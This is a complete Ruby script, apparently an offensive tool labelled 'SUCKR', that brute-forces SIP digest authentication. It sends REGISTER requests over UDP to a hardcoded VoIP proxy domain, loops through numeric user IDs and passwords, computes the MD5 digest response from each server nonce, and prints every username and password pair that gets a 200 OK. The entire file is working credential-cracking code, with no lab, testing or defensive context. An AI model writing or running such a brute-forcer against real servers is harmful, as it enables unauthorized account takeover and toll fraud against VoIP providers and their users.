#!/usr/bin/env ruby

require 'socket'
require 'digest/md5'

user_min=2000
user_max=10999
pass_min=2000
pass_max=109999


method="REGISTER"
domain="proxy.uphreak.com"
uri="sip:#{domain}"

port=5060


# this function generates the response to a auth request
def get_response(user,realm,pass,method,uri,nonce)
  # generate a1, ha1
  a1=[user, realm, pass].join(":")
  #puts "a1 = #{a1}"
  ha1 = Digest::MD5::hexdigest(a1)

  # generate a2, ha2
  a2=[method,uri].join(":")
  #puts "a2 = #{a2}"
  ha2 = Digest::MD5::hexdigest(a2)

  # generate response
  request_digest=[ha1,nonce,ha2].join(":")
  #puts "request_digest = #{request_digest}"
  response = Digest::MD5::hexdigest(request_digest)
  return response
end

# open up a udp socket to send messages
sock = UDPSocket.new

for user in user_min..user_max
  puts "brute forcing user #{user} on #{domain} with password range #{pass_min}-#{pass_max}"
  start = Time.now
  for pass in pass_min..pass_max
    # setup the initial registration sip message
    sipmsgs={}
sipmsgs[:register]=<<END
#{method} #{uri} SIP/2.0\r
Via: SIP/2.0/UDP 127.0.0.1:#{port};rport;branch=foo\r
Max-Forwards: 70\r
From: <sip:#{user}@#{domain}>;tag=bar\r
To: <sip:#{user}@#{domain}>\r
Call-ID: bas\r
CSeq: 1 #{method}\r
User-Agent: SUCKR\r
Contact: <sip:#{user}@127.0.0.1:#{port}>\r
Expires: 300\r
Content-Length:  0\r
END

    # send it a registration message
    sock.send(sipmsgs[:register],0,domain,port)
    # listen for response
    reg_response=sock.recvfrom(1755)
    # get the Authorization header and parse out the realm and nonce
    realm=""
    nonce=""
    reg_response[0].split("\r\n").each do | header |
      if(header =~ /^WWW-Authenticate/)
        if(header =~ /realm="([a-zA-Z0-9_\.]+)"/)
          realm=$1
        end
        if(header =~ /nonce="([a-zA-Z0-9_\.]+)"/)
            nonce=$1
        end
      end
    end

    # generate the reponse
    response=""
    if(realm!="" && nonce!="")
      response=get_response(user,realm,pass,method,uri,nonce)
    end

    # build a new sip message to reply with
sipmsgs[:register_auth]=<<END
#{method} #{uri} SIP/2.0\r
Via: SIP/2.0/UDP 127.0.0.1:#{port};rport;branch=foo\r
Max-Forwards: 70\r
From: <sip:#{user}@#{domain}>;tag=bar\r
To: <sip:#{user}@#{domain}>\r
Call-ID: bas\r
CSeq: 2 #{method}\r
User-Agent: SUCKR\r
Contact: <sip:#{user}@127.0.0.1:#{port}>\r
Expires: 300\r
Authorization: Digest username="#{user}", realm="#{realm}", nonce="#{nonce}", uri="#{uri}", response="#{response}"\r
Content-Length:  0\r
END

    # send the sip message
    sock.send(sipmsgs[:register_auth],0,domain,port)
    # listen for response
    auth_response=sock.recvfrom(1755)
    if(auth_response[0] =~ /200 OK/)
       puts "#{user},#{pass},#{domain}"
       # we have cracked a password - so we can break out of the inner loop
       elapsed = Time.now - start
       puts "<-- took #{elapsed} seconds to crack user #{user} -->"
       break
    end
  end # for pass in pass_min..pass_max
end # for user in user_min..user_max
